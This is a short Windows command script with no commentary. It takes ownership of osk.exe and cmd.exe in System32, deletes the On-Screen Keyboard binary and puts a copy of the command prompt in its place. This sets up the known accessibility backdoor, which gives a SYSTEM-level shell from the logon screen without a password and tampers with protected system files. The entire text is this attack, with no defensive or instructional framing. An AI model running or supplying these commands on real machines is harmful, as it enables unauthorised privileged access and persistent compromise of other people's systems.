takeown /f "C:\Windows\System32\osk.exe"
icacls "C:\Windows\System32\osk.exe" /grant Administrator:F
takeown /f "C:\Windows\System32\cmd.exe"
icacls "C:\Windows\System32\cmd.exe" /grant Administrator:F
del C:\Windows\System32\osk.exe
ren C:\Windows\System32\cmd.exe osk1.exe
copy C:\Windows\System32\osk1.exe C:\Windows\System32\cmd.exe
ren C:\Windows\System32\osk1.exe osk.exe